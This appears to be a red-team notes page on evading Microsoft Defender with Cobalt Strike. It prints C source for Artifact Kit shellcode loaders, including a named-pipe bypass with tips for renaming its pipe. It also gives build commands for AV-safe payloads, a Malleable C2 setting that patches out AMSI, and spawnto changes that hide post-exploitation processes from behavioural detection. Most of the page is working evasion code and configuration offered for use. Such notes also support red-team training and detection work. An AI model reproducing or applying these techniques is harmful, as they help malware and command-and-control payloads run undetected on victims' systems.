---
title: Microsoft Defender Antivirus
category: Red Team
order: 14
---

Microsoft Defender has three facets to its detection capability:

* On-Disk
* In-Memory
* Behavioural

We can consult Defender detections via powershell.

```powershell
Get-MpThreatDetection | sort $_.InitialDetectionTime | select -First 1
```
# On-Disk Detections

Even though dropping files to disk has a bad reputation, there are instances whre it's fairly unvoidable if we want to employ certain tactics.

Defender has a database of definitions from which it can detect "known bad" very quickly. We can user `ThreatCheck` to identify which part of a file Defender dislikes.

* [https://github.com/rasta-mouse/ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)

## Artifact Kit

The Artifact Kit is used to modify the binary (EXE & DLL) payloads.

The signature for the default Cobalt Strike Beacon payload could be flagged. So we need to rebuild the payloads with  the `Artifact Kit`.

> **Note**: Sometimes building with a different version of `gcc` can produce enough changes to break the signature.


The Artifact Kit is designed to facilitate the development of AV-safe variants of these payloads based on the premise of loading shellcode in a manner in which AV engines cannot emulate. It works on a system of "bypass templates" which allow you to change existing bypass strategies for reading shelldoce, or implement entirely new ones.



* `src-main/main.c` is the entry point of the EXE artifacts. It does nothing more han run a function called `start` and the njus loops to prevent the process from closing.

```c
#include "windows.h"

void start(HINSTANCE handle);

int main(int argc, char * argv[]) {
        start(NULL);

        /* sleep so we don't exit */
        while (TRUE)
                Sleep(10000);

        return 0;
}
```

* `src-common/bypass-template.c` is not a bypass, but it servers to show how one can implement some logic inside the `start` function.

We can see that it grabs the payload buffer, copies it into memory, calls a `spawn` function and then frees the buffer.

```c
#include <windows.h>
#include <stdio.h>
#include "patch.h"

/* The start function gets called when the bypass is ready to execute. The HINSTANCE is
   a handle to the current artifact. You can use this to determine the location of this
   artifact on disk (if it helps your bypass technique) */
void start(HINSTANCE mhandle) {
        /* phear is a struct that defines how artifact.cna will patch the payload data
           into this artifact. You're welcome to update artifact.cna to use your own
           convention if you like. */
        phear * payload = (phear *)data;
        char * buffer;

        /* copy our payload into its own buffer... necessary b/c spawn modifies it */
        buffer = (char *)malloc(payload->length);
        memcpy(buffer, payload->payload, payload->length);

        /* execute our payload */
        spawn(buffer, payload->length, payload->key);

        /* clean up after ourselves */
        free(buffer);
}
```

* `src-common/bypass-pipe.c`, this is one fo the bypass strategies included in the kit.

```c
#include <windows.h>
#include <stdio.h>
#include "patch.h"

/* a place to track our random-ish pipe name */
char pipename[64];

void server(char * data, int length) {
        DWORD  wrote = 0;
        HANDLE pipe = CreateNamedPipeA(pipename, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE, 1, 0, 0, 0, NULL);

        if (pipe == NULL || pipe == INVALID_HANDLE_VALUE)
                return;

        BOOL result = ConnectNamedPipe(pipe, NULL);
        if (!result)
                return;

        while (length > 0) {
                result = WriteFile(pipe, data, length, &wrote, NULL);
                if (!result)
                        break;

                data   += wrote;
                length -= wrote;
        }
        CloseHandle(pipe);
}

BOOL client(char * buffer, int length) {
        DWORD  read = 0;
        HANDLE pipe = CreateFileA(pipename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

        if (pipe == INVALID_HANDLE_VALUE)
              return FALSE;

        while (length > 0) {
                BOOL result = ReadFile(pipe, buffer, length, &read, NULL);
                if (!result)
                        break;

                buffer += read;
                length -= read;
        }

        CloseHandle(pipe);
        return TRUE;
}

DWORD server_thread(LPVOID whatever) {
        phear * payload = (phear *)data;

        /* setup a pipe for our payload */
        server(payload->payload, payload->length);

        return 0;
}

DWORD client_thread(LPVOID whatever) {
        phear * payload = (phear *)data;

        /* allocate data for our "cleaned" payload */
        char * buffer = (char *)malloc(payload->length);

        /* try to connect to the pipe */
        do {
                Sleep(1024);
        }
        while (!client(buffer, payload->length));

        /* spawn our payload */
        spawn(buffer, payload->length, payload->key);
        return 0;
}

void start(HINSTANCE mhandle) {
        /* switched from snprintf... as some A/V product was flagging based on the function *sigh* */
        sprintf(pipename, "%c%c%c%c%c%c%c%c%cnetsvc\\%d", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));

        /* start our server and our client */
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&server_thread, (LPVOID) NULL, 0, NULL);
        client_thread(NULL);
}
```
First `sprintf` is used to create a pseudo-random pipe called `\\.\pipe\netsvc\X` where `X` is a random integer. `server_thread` will start a new named pipe server and copy the shellcode buffer into it. `client_thread` will read the shellcode from the pipe and the ncall those same spawn & free functions.

So, the only difference between bypass-template and bypass-pipe is that memcpy is replaced with named pipes.  Although there is some scope for detecting other aspects of this specific bypass technique, such as the pipe name.  That is, of course, trivial to change here.

```c
sprintf(pipename, "%c%c%c%c%c%c%c%c%cchangeme\\%d", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));
```

### Building the Artifact Kit

After making our modifications we need to recompile it. The Artifact Kit is designed to be build on Linux via the included `build.sh` script.

* Usage:

```
./build.sh
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [-] Missing Parameters:
[Artifact kit] [-] Usage:
[Artifact kit] [-] ./build <techniques> <allocator> <stage> <rdll size> <include resource file> <output directory>
[Artifact kit] [-]  - Techniques       - a space separated list
[Artifact kit] [-]  - Allocator        - set how to allocate memory for the reflective loader.
[Artifact kit] [-]                       Valid values [HeapAlloc VirtualAlloc MapViewOfFile]
[Artifact kit] [-]  - Stage Size       - integer used to set the space needed for the beacon stage.
[Artifact kit] [-]                       For a 5K   RDLL stage size should be 277492 or larger
[Artifact kit] [-]                       For a 100K RDLL stage size should be 277492 or larger
[Artifact kit] [-]  - RDLL Size        - integer used to specify the RDLL size. Valid values [0, 5, 100]
[Artifact kit] [-]  - Resource File    - true or false to include the resource file
[Artifact kit] [-]  - stack spoof      - true or false to use the stack spoofing technique
[Artifact kit] [-]  - Output Directory - Destination directory to save the output
[Artifact kit] [-] Example:
[Artifact kit] [-]   ./build.sh "peek pipe readfile" HeapAlloc 361000 5 true true /tmp/dist/artifact
```

* **Techniques**: Are the bypass templates to compile, we can provide just one or a space-separated list.
* **Allocator**: Defines the API used to allocate memory for the shellcode. The out-of-the-box options are `HeapAlloc`, `VirtualAlloc` and `MapViewOfFile`. You can create a custom allocation by adding one in `patch.c`.
* **Stage Size**: Defines the space required for Beacon's reflective DLL loader. This loader can be modified using the User Defined Reflective Loader (UDRL) kit. Default size is 5K.
* **RDLL Size**: This option is used to sanity-check the value you provided for the **stage size**. For example, if you specified 271360 for the stage size, but 100 for the RDLL size, the build script will abort and tell you that 271360 is not large enough for a 100K loader.  Note that the "minimum" stage size can change between CS versions.
* **Resource File**: Allows you to build the arficat with custom metadata, there is an included resource file `src-main/resource.rc` that we can modify to give the artifact different version numbers, product name, company name, and even an icon.
* **Stack Spoof**: Simple Boolean option, which enables call stack spoofing whilst the Beacon is sleeping.
* **Output Directory**: Is the location where you want the artifact build.

After building it will produce an `artifact.cna` file that we need to load into the CobaltStrike `Cobalt Strike -> Script Manager -> Load`.

# In-Memory Detections

The AMSI is a component of Windows which allows applications to integrate themselves with an antivirus engine. It was designed to tackle fileless malware.

Any third party application can use AMSI to scan user input for malicious content. Many Windows Components now also use AMSI Including PowerShell, the Windows Script Host, JavaScript, VBScript and VBA.

## Resource Kit

Resource Kit is used to modify the script-based payloads including PowerShell, Python, HTA and VBA templates.

HelpSsytems have already provided a template with different variables names (`$zz` instead of `$x` and `$v_code` instead of `$var_code`) that will bypass defender. So we can upload and use the `resource.cna` of HelpSystems to bypass Defender.

## AMSI vs Post-Exploitation

The Beacon payload is not the only place AMSI will be present. In various post-exploitation commands AMSI will instrument. For example `powershell`, `powerpick`, `execute-assembly` and more over. This occurs because Beacon will spawn new process to execute these commands, and each process gets its own copy of AMSI.

It would be a bit of a pain to modify and obfuscate every single post-ex tool, so Coblalt Strike introuced a configuration that we can apply in **Malleable C2 profile** called `amsi_disable`. This uses a memory-patching technique to disable AMSI in the spawned process prior to injecting the post-ex capability.


```
post-ex {
        set amsi_disable "true";
}
```

> **Note**: `amsi_disable` only applies to `powerpick`, `execute-assembly` and `psinject`. It does not apply to the `powershell` command.

# Behavioural Detections

When Cobalt Strike runs a post-ex command that uses the `fork & run` pattern, it will spawn a sacrificial process, inject the post-ex capability into it, retrieve the output over a named pipe, and then kills the process. The reason is to ensure that unstable post-ex tools don't crash the Beacon.

`rundll32` being the default `spawnto` for Cobalt Strike is a common point of detection. The service binary payload used by psexec also uses this by default, which is why you see those Beacons running as `rundll32.exe`.

The process used for post-ex commands and psexec can be changed on the fly in the CS GUI. To change it run `spawnto`, x64 and x86 must be specified individually and environment variables can also be used.

```
beacon> spawnto x64 %windir%\sysnative\dllhost.exe
beacon> spawnto x86 %windir%\syswow64\dllhost.exe
```

> **Note**: The `sysnative` and `syswow64` paths should be used rathen than `system32`.

We can reset to default values with `spawnto` command:

```
beacon> spawnto
[*] Tasked beacon to spawn features to default process
```

To change the spawnto used by `psexec` use the `ak-settings` commands.

```
beacon> ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
[*] Updating the spawnto_x64 process to 'C:\Windows\System32\dllhost.exe'
[*] artifact kit settings:
[*]    service     = ''
[*]    spawnto_x86 = 'C:\Windows\SysWOW64\rundll32.exe'
[*]    spawnto_x64 = 'C:\Windows\System32\dllhost.exe'

beacon> ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe
[*] Updating the spawnto_x86 process to 'C:\Windows\SysWOW64\dllhost.exe'
[*] artifact kit settings:
[*]    service     = ''
[*]    spawnto_x86 = 'C:\Windows\SysWOW64\dllhost.exe'
[*]    spawnto_x64 = 'C:\Windows\System32\dllhost.exe'
```

> **Note**: The Artifact Kit does not support the use of environment variables by default. You may also change the name of the service with:
>
> `ak-settings service [name]`

The default spawnto can be change inside the `Malleable C2 Profile` by including the `spawnto_x64` and `spawnto_x86` inside the post-ex block.

```
post-ex {
        set amsi_disable "true";

        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
}
```